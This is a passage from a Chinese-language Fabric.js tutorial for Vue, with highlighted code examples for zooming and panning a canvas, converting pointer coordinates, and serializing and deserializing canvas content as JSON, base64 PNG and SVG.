    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 初始化画布</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// 矩形</span>
  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">10</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">10</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'orange'</span>
  })

  <span class="hljs-comment">// 圆形</span>
  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'green'</span>
  })
  canvas.<span class="hljs-title function_">add</span>(rect, circle) <span class="hljs-comment">// 将矩形和圆形添加到画布中</span>

  <span class="hljs-comment">// 监听鼠标滚轮事件</span>
  canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:wheel'</span>, <span class="hljs-function"><span class="hljs-params">opt</span> =&gt;</span> {
    <span class="hljs-keyword">let</span> delta = opt.<span class="hljs-property">e</span>.<span class="hljs-property">deltaY</span> <span class="hljs-comment">// 滚轮向上滚一下是 -100，向下滚一下是 100</span>
    <span class="hljs-keyword">let</span> zoom = canvas.<span class="hljs-title function_">getZoom</span>() <span class="hljs-comment">// 获取画布当前缩放值</span>

    <span class="hljs-comment">// 控制缩放范围在 0.01~20 的区间内</span>
    zoom *= <span class="hljs-number">0.999</span> ** delta
    <span class="hljs-keyword">if</span> (zoom &gt; <span class="hljs-number">20</span>) zoom = <span class="hljs-number">20</span>
    <span class="hljs-keyword">if</span> (zoom &lt; <span class="hljs-number">0.01</span>) zoom = <span class="hljs-number">0.01</span>

    <span class="hljs-comment">// 设置画布缩放比例</span>
    canvas.<span class="hljs-title function_">setZoom</span>(zoom)
  })
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-52">以鼠标指针为基准缩放画布</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d088f94b09644deb9c144f358b85420~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=j2G5CKuTfCJ5kLpdH%2FPSkesX8ZU%3D" alt="053.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 初始化画布</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// 矩形</span>
  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">130</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">130</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'orange'</span>
  })

  <span class="hljs-comment">// 圆形</span>
  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">150</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">150</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'green'</span>
  })
  canvas.<span class="hljs-title function_">add</span>(rect, circle) <span class="hljs-comment">// 将矩形和圆形添加到画布中</span>

  <span class="hljs-comment">// 监听鼠标滚轮事件</span>
  canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:wheel'</span>, <span class="hljs-function"><span class="hljs-params">opt</span> =&gt;</span> {
    <span class="hljs-keyword">let</span> delta = opt.<span class="hljs-property">e</span>.<span class="hljs-property">deltaY</span> <span class="hljs-comment">// 滚轮向上滚一下是 -100，向下滚一下是 100</span>
    <span class="hljs-keyword">let</span> zoom = canvas.<span class="hljs-title function_">getZoom</span>() <span class="hljs-comment">// 获取画布当前缩放值</span>

    <span class="hljs-comment">// 控制缩放范围在 0.01~20 的区间内</span>
    zoom *= <span class="hljs-number">0.999</span> ** delta
    <span class="hljs-keyword">if</span> (zoom &gt; <span class="hljs-number">20</span>) zoom = <span class="hljs-number">20</span>
    <span class="hljs-keyword">if</span> (zoom &lt; <span class="hljs-number">0.01</span>) zoom = <span class="hljs-number">0.01</span>

    <span class="hljs-comment">// 设置画布缩放比例</span>
    <span class="hljs-comment">// 关键点！！！</span>
    <span class="hljs-comment">// 参数1：将画布的所放点设置成鼠标当前位置</span>
    <span class="hljs-comment">// 参数2：传入缩放值</span>
    canvas.<span class="hljs-title function_">zoomToPoint</span>(
      {
        <span class="hljs-attr">x</span>: opt.<span class="hljs-property">e</span>.<span class="hljs-property">offsetX</span>, <span class="hljs-comment">// 鼠标x轴坐标</span>
        <span class="hljs-attr">y</span>: opt.<span class="hljs-property">e</span>.<span class="hljs-property">offsetY</span>  <span class="hljs-comment">// 鼠标y轴坐标</span>
      },
      zoom <span class="hljs-comment">// 最后要缩放的值</span>
    )
  })
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-53">平移画布</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 初始化画布</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// 矩形</span>
  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">130</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">130</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'orange'</span>
  })

  <span class="hljs-comment">// 圆形</span>
  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">150</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">150</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'green'</span>
  })
  canvas.<span class="hljs-title function_">add</span>(rect, circle) <span class="hljs-comment">// 将矩形和圆形添加到画布中</span>

  canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:down'</span>, <span class="hljs-function"><span class="hljs-params">opt</span> =&gt;</span> { <span class="hljs-comment">// 鼠标按下时触发</span>
    <span class="hljs-keyword">let</span> evt = opt.<span class="hljs-property">e</span>
    <span class="hljs-keyword">if</span> (evt.<span class="hljs-property">altKey</span> === <span class="hljs-literal">true</span>) { <span class="hljs-comment">// 是否按住alt</span>
      canvas.<span class="hljs-property">isDragging</span> = <span class="hljs-literal">true</span> <span class="hljs-comment">// isDragging 是自定义的，开启移动状态</span>
      canvas.<span class="hljs-property">lastPosX</span> = evt.<span class="hljs-property">clientX</span> <span class="hljs-comment">// lastPosX 是自定义的</span>
      canvas.<span class="hljs-property">lastPosY</span> = evt.<span class="hljs-property">clientY</span> <span class="hljs-comment">// lastPosY 是自定义的</span>
    }
  })

  canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:move'</span>, <span class="hljs-function"><span class="hljs-params">opt</span> =&gt;</span> { <span class="hljs-comment">// 鼠标移动时触发</span>
    <span class="hljs-keyword">if</span> (canvas.<span class="hljs-property">isDragging</span>) {
      <span class="hljs-keyword">let</span> evt = opt.<span class="hljs-property">e</span>
      <span class="hljs-keyword">let</span> vpt = canvas.<span class="hljs-property">viewportTransform</span> <span class="hljs-comment">// 聚焦视图的转换</span>
      vpt[<span class="hljs-number">4</span>] += evt.<span class="hljs-property">clientX</span> - canvas.<span class="hljs-property">lastPosX</span>
      vpt[<span class="hljs-number">5</span>] += evt.<span class="hljs-property">clientY</span> - canvas.<span class="hljs-property">lastPosY</span>
      canvas.<span class="hljs-title function_">requestRenderAll</span>() <span class="hljs-comment">// 重新渲染</span>
      canvas.<span class="hljs-property">lastPosX</span>  = evt.<span class="hljs-property">clientX</span>
      canvas.<span class="hljs-property">lastPosY</span>  = evt.<span class="hljs-property">clientY</span>
    }
  })

  canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:up'</span>, <span class="hljs-function"><span class="hljs-params">opt</span> =&gt;</span> { <span class="hljs-comment">// 鼠标松开时触发</span>
    canvas.<span class="hljs-title function_">setViewportTransform</span>(canvas.<span class="hljs-property">viewportTransform</span>) <span class="hljs-comment">// 设置此画布实例的视口转换  </span>
    canvas.<span class="hljs-property">isDragging</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">// 关闭移动状态</span>
  })
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-54">获取真实的转换坐标</h3>
<p>在图像处理的过程中，我们经常会用到坐标点信息，以便于进行一些交互操作。</p>
<p>此处举一个简单的例子，当鼠标点击时，在鼠标的位置创建一个方块对象：</p>
<pre><code class="hljs language-ts" lang="ts">      <span class="hljs-comment">// 当鼠标按下时</span>
      canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:down'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">option</span>) {
        <span class="hljs-keyword">const</span> evt = option.<span class="hljs-property">e</span>;
        <span class="hljs-comment">// 创建一个小方块</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
          <span class="hljs-attr">left</span>: evt.<span class="hljs-property">offsetX</span>,
          <span class="hljs-attr">top</span>: evt.<span class="hljs-property">offsetY</span>,
          <span class="hljs-attr">width</span>: <span class="hljs-number">50</span>,
          <span class="hljs-attr">height</span>: <span class="hljs-number">50</span>,
          <span class="hljs-attr">fill</span>: <span class="hljs-string">'yellow'</span>
        }))
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderAll</span>();
      });
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/856a6df7b0ed4ce5b90f80bfd8415ddf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=jqyqbUb2gFXwbkMoWnhP3nOPyjA%3D" alt="recording.gif" loading="lazy"/></p>
<p>从上图可见，当canvas未平移或缩放时，可以很简单的获取相应点位置，但是一但平移或者缩放后，鼠标点的位置就全乱了。Fabric.js 提供了 <strong>transformPoint</strong> 方法解决这一问题。</p>
<ul>
<li>
<p><strong>fabric.util.transformPoint(Point, transform)</strong> :</p>
<ul>
<li>将Canvas坐标点转换为视口坐标点</li>
<li>例如：<em>fabric.util.transformPoint(new fabric.Point(100, 100), canvas.viewportTransform)</em> ，将视口的（100,100）坐标点转化为平移缩放后的坐标点。</li>
</ul>
</li>
<li>
<p><strong>Canvas.getPointer(event)</strong> :</p>
<ul>
<li>用于获取事件（如鼠标或触摸事件）发生时相对于画布的坐标。它考虑了当前视口的变换（包括平移和缩放），因此可以正确地将鼠标或触摸事件的屏幕坐标转换为画布坐标。</li>
</ul>
</li>
</ul>
<p>修改代码：</p>
<pre><code class="hljs language-ts" lang="ts">      <span class="hljs-comment">// 当鼠标按下时</span>
      canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:down'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">option</span>) {
        <span class="hljs-keyword">const</span> evt = option.<span class="hljs-property">e</span>;
        <span class="hljs-comment">// 用transformPoint创建一个小方块</span>
        <span class="hljs-comment">// 注意 transformPoint 作用是将一个坐标从一个坐标系转换到另一个坐标系</span>
        <span class="hljs-comment">// 由于这里的将按下的视口坐标转换成 canvas画布坐标系，所以需要用 invertTransform 反转变换</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
          <span class="hljs-attr">left</span>: fabric.<span class="hljs-property">util</span>.<span class="hljs-title function_">transformPoint</span>({ <span class="hljs-attr">x</span>: evt.<span class="hljs-property">offsetX</span>, <span class="hljs-attr">y</span>: evt.<span class="hljs-property">offsetY</span> },  fabric.<span class="hljs-property">util</span>.<span class="hljs-title function_">invertTransform</span>(canvas.<span class="hljs-property">viewportTransform</span>)).<span class="hljs-property">x</span>,
          <span class="hljs-attr">top</span>: fabric.<span class="hljs-property">util</span>.<span class="hljs-title function_">transformPoint</span>({ <span class="hljs-attr">x</span>: evt.<span class="hljs-property">offsetX</span>, <span class="hljs-attr">y</span>: evt.<span class="hljs-property">offsetY</span> }, fabric.<span class="hljs-property">util</span>.<span class="hljs-title function_">invertTransform</span>(canvas.<span class="hljs-property">viewportTransform</span>)).<span class="hljs-property">y</span>,
          <span class="hljs-attr">width</span>: <span class="hljs-number">50</span>,
          <span class="hljs-attr">height</span>: <span class="hljs-number">50</span>,
          <span class="hljs-attr">fill</span>: <span class="hljs-string">'red'</span>
        }))
        <span class="hljs-comment">// 用getPointer创建一个小方块</span>
        <span class="hljs-keyword">const</span> pointer = canvas.<span class="hljs-title function_">getPointer</span>(evt);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'potint, '</span>, pointer)
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
          <span class="hljs-attr">left</span>: pointer.<span class="hljs-property">x</span>,
          <span class="hljs-attr">top</span>: pointer.<span class="hljs-property">y</span>,
          <span class="hljs-attr">width</span>: <span class="hljs-number">50</span>,
          <span class="hljs-attr">height</span>: <span class="hljs-number">50</span>,
          <span class="hljs-attr">fill</span>: <span class="hljs-string">'blue'</span>
        }))
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderAll</span>();
      });
</code></pre>
<p>注意 transformPoint 作用是将一个坐标从一个坐标系转换到另一个坐标系，由于这里的将按下的视口坐标转换成 canvas画布坐标系，所以需要用 invertTransform 反转变换。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30e0350fbec0494a87e39c57b2a16121~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=Cpq2RZjIIR6DA%2B%2Bxv6ecXBBjMTs%3D" alt="3C730B8B-C74E-4BD5-B5DA-B66851E96B6C.gif" loading="lazy"/></p>
<h2 data-id="heading-55">序列化</h2>
<h3 data-id="heading-56">输出JSON</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 初始化画布</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'canvas stringify '</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(canvas))
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'canvas toJSON'</span>, canvas.<span class="hljs-title function_">toJSON</span>())
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'canvas toObject'</span>, canvas.<span class="hljs-title function_">toObject</span>())
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>打开控制台可以看到输出。</p>
<h3 data-id="heading-57">输出base64</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 初始化画布</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>, {
    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'#a5dee5'</span>
  })

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'green'</span>
  })

  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">80</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">80</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">"red"</span>
  })

  canvas.<span class="hljs-title function_">add</span>(rect, circle)

  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'toPng'</span>, canvas.<span class="hljs-title function_">toDataURL</span>(<span class="hljs-string">'png'</span>)) <span class="hljs-comment">// 在控制台输出 png（base64）</span>
  canvas.<span class="hljs-title function_">requestRenderAll</span>()
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-58">输出 SVG</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 初始化画布</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>, {
    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'#a5dee5'</span>
  })

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'green'</span>
  })

  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">80</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">80</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">"red"</span>
  })

  canvas.<span class="hljs-title function_">add</span>(rect, circle)

  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(canvas.<span class="hljs-title function_">toSVG</span>()) <span class="hljs-comment">// 输出 SVG</span>
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-59">反序列化</h2>
<p>反序列化就是把 <code>JSON</code> 数据渲染到画布上。</p>
<p>通常把从后台请求回来的数据渲染到画布上。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> jsonStr = <span class="hljs-string">''</span>

  <span class="hljs-comment">// 初始化画布</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// 反序列化</span>
  canvas.<span class="hljs-title function_">loadFromJSON</span>(jsonStr)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-60">总结</h2>
<p>写到这里，我们已经把 Fabric.js 常见功能都过了一遍。如果你坚持看到这里，恭喜你！你已经具备构建一个简单画板/海报编辑器/可视化工具的基础能力。</p>
